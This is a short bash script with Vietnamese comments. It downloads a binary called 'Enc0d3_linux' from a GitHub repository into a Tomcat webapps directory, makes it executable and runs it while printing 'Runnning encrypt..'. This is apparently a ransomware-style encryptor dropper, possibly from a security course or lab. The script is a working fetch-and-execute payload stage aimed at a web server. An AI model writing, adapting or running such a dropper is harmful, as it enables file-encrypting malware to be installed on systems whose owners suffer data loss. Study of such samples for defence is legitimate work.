#!/bin/bash

# Đặt thư mục đích
DEST_DIR="/opt/tomcat/webapps"

# Tải file từ URL và lưu vào thư mục đích
echo "Downloading..."
wget -O "$DEST_DIR/Enc0d3_linux" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/Enc0d3_linux

if [ $? -eq 0 ]; then
    echo "success download."
else
    echo "fail download." >&2
    exit 1
fi

# Đặt quyền thực thi cho file đã tải
chmod +x "$DEST_DIR/Enc0d3_linux"
echo "change excute permisson file."

# Chạy file
echo "Runnning encrypt.."
"$DEST_DIR/Enc0d3_linux"

if [ $? -eq 0 ]; then
    echo "Runiing success."
else
    echo "Lỗi khi chạy file." >&2
    exit 1
fi
